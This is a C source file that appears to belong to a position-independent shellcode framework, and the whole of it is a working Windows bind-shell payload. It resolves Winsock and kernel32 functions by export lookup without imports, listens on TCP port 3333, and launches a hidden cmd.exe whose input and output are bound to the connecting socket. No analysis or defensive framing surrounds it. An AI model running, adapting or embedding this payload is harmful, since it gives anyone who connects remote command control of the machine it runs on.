#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

#include "common.h"
#include "pe.h"
#include "sockapi.h"

typedef struct _SOCKAPI
{
    WSAStartup_t            WSAStartup;
    WSASocketA_t            WSASocketA;
    bind_t                  bind;
    listen_t                listen;
    accept_t                accept;
    LoadLibraryA_t          LoadLibraryA;
    CloseHandle_t           CloseHandle;
    WaitForSingleObject_t   WaitForSingleObject;
    CreateProcessA_t        CreateProcessA;
}
SOCKAPI, *PSOCKAPI;


#define htons(x) \
     ((((x) & 0xff) << 8) | (((x) & 0xff00) >> 8))

#define WS_SYM(name) \
    INLINE_STR(str_ ## name, str(name)); \
    (pApi-> name) = (name ## _t) scGetProcAddr(hWs2_32, str_ ## name);

#define K32_SYM(name) \
    INLINE_STR(str_ ## name, str(name)); \
    (pApi-> name) = (name ## _t) scGetProcAddr(hKernel32, str_ ## name);

// forward declarations so that scMain is the first function in here
PVOID LoadWinsock(PSOCKAPI pApi);
int bindshell(PSOCKAPI pApi);

SCFUNC void scMain(void)
{
    SOCKAPI api;
    LoadWinsock(&api);
    bindshell(&api);
}

SCFUNC PVOID LoadWinsock(PSOCKAPI pApi)
{
    INLINE_STR(str_kernel32, "kernel32");
    INLINE_STR(str_ws2_32, "ws2_32");

    PVOID hKernel32 = scGetModuleBase(str_kernel32);
    if (hKernel32 == NULL)
        return NULL;

    K32_SYM(LoadLibraryA);
    PVOID hWs2_32 = pApi->LoadLibraryA(str_ws2_32);
    if (hWs2_32 == NULL)
        return NULL;

    WS_SYM(WSAStartup);
    WS_SYM(WSASocketA);
    WS_SYM(bind);
    WS_SYM(listen);
    WS_SYM(accept);

    K32_SYM(CloseHandle);
    K32_SYM(WaitForSingleObject);
    K32_SYM(CreateProcessA);

    return hWs2_32;
}

SCFUNC int bindshell(PSOCKAPI pApi)
{
    WSADATA WSAData;
    SOCKET s, clientsock;
    struct sockaddr_in sockinfo = {0};
    struct sockaddr_in clientinfo = {0};
    int clientlen = sizeof(clientinfo);
    int r;

    INLINE_STR(str_cmd, "cmd");

    sockinfo.sin_addr.s_addr = INADDR_ANY;
    sockinfo.sin_family = AF_INET;
    sockinfo.sin_port = htons(3333);

    pApi->WSAStartup(2, &WSAData);

    s = pApi->WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    r = pApi->bind(s, (struct sockaddr *)&sockinfo, sizeof(sockinfo));
    if (r != 0)
        return 0;

    r = pApi->listen(s, 10);
    if (r != 0)
        return 0;

    clientsock = pApi->accept(s, (struct sockaddr *) &clientinfo, &clientlen);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};

    si.cb = sizeof(si);
    si.wShowWindow = SW_HIDE;
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = (HANDLE) clientsock;
    si.hStdOutput = (HANDLE) clientsock;
    si.hStdError = (HANDLE) clientsock;
    BOOL bRet = pApi->CreateProcessA(
            NULL, (LPSTR)str_cmd, NULL, NULL, TRUE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    pApi->WaitForSingleObject(pi.hProcess, INFINITE);

    pApi->CloseHandle(pi.hProcess);
    pApi->CloseHandle(pi.hThread);

    return 1;
}


int main(int argc, char* argv[])
{
    scMain();
    return 0;
}

